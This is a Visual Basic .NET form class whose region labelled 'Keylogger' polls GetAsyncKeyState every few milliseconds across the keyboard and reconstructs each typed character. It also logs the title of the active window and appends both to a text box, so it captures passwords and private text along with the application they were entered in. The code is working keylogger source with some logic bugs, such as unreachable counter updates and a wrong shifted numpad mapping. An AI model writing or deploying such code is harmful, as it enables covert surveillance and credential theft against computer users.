Public Class FrmMain

#Region "Declare"
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int32
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Int32) As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Dim LastStr As String, i As Object, KeyPressed As Object
    Dim charCount As Short, lineLimit As Short = 69, addkey As Object
#End Region

#Region "EntryPoint"
    Sub New()
        InitializeComponent()
        SetTimer()
        StartTimer()
    End Sub
#End Region

#Region "SetTimer"
    Private Sub SetTimer()
        kClock.Interval = 6
        tClock.Interval = 60
    End Sub
#End Region

#Region "StartTimer"
    Private Sub StartTimer()
        kClock.Start()
        tClock.Start()
    End Sub
#End Region

#Region "Function"
    Public Function getCapslock() As Boolean
        getCapslock = CBool(GetKeyState(Keys.Capital) And 1)
    End Function
    Public Function getShift() As Boolean
        getShift = CBool(GetAsyncKeyState(Keys.ShiftKey))
    End Function
    Private Function GetActiveWindowTitle() As String
        On Error Resume Next
        Dim Str As String
        Str = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, Str, 100)
        Str = Str.Substring(0, InStr(Str, Chr(0)) - 1)
        Return Str
    End Function
#End Region

#Region "Keylogger"
    Private Sub kClock_Tick(sender As Object, e As EventArgs) Handles kClock.Tick
        On Error Resume Next
        KeyPressed = GetAsyncKeyState(13)
        If KeyPressed = -32767 Then
            charCount = 0
            addkey = vbCrLf
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(8)
        If KeyPressed = -32767 Then
            addkey = "<BackSpace>"
            charCount += 4
            GoTo KeyFound
        End If


        KeyPressed = GetAsyncKeyState(32)
        If KeyPressed = -32767 Then
            addkey = " "
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(186)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ";"
            Else
                addkey = ":"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(187)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "="
            Else
                addkey = "+"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(188)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ","
            Else
                addkey = "<"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(189)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "-"
            Else
                addkey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(190)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "."
            Else
                addkey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(191)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "/"
            Else
                addkey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(192)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "`"
            Else
                addkey = "~"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(96)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "0"
            Else
                addkey = ")"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(97)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "1"
            Else
                addkey = "!"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(98)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "2"
            Else
                addkey = "@"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(99)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "3"
            Else
                addkey = "#"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(100)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "4"
            Else
                addkey = "$"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(101)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "5"
            Else
                addkey = "%"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(102)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "6"
            Else
                addkey = "7"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(103)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "7"
            Else
                addkey = "&"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(104)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "8"
            Else
                addkey = "*"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(105)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "9"
            Else
                addkey = "("
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(106)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "*"
                charCount += 1
            Else
                addkey = ""
            End If
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(107)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "+"
            Else
                addkey = "="
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(108)
        If KeyPressed = -32767 Then
            addkey = ""
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(109)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "-"
            Else
                addkey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(110)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "."
            Else
                addkey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(111)
        If KeyPressed = -32767 Then
            addkey = "/"
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(2)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "/"
            Else
                addkey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(220)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "\"
            Else
                addkey = "|"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(222)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "'"
            Else
                addkey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(221)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "]"
            Else
                addkey = "}"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(219)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "["
            Else
                addkey = "{"
            End If
            GoTo KeyFound
            charCount += 1
        End If


        For i = 65 To 128
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addkey = "!"
                        Case 2
                            addkey = "@"
                        Case 3
                            addkey = "#"
                        Case 4
                            addkey = "$"
                        Case 5
                            addkey = "%"
                        Case 6
                            addkey = "^"
                        Case 7
                            addkey = "&"
                        Case 8
                            addkey = "*"
                        Case 9
                            addkey = "("
                        Case 0
                            addkey = ")"
                    End Select
                Else
                    addkey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        Application.DoEvents()
        Exit Sub


KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            TextBox.AppendText(vbCrLf)
        End If
        If addkey <> "" Then TextBox.AppendText(addkey)
        Application.DoEvents()

    End Sub

    Private Sub tClock_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tClock.Tick
        On Error Resume Next
        If LastStr <> GetActiveWindowTitle() Then
            TextBox.AppendText(vbNewLine & " [ --" & GetActiveWindowTitle() & "--]" & vbNewLine)
            LastStr = GetActiveWindowTitle()
        End If
    End Sub
#End Region

End Class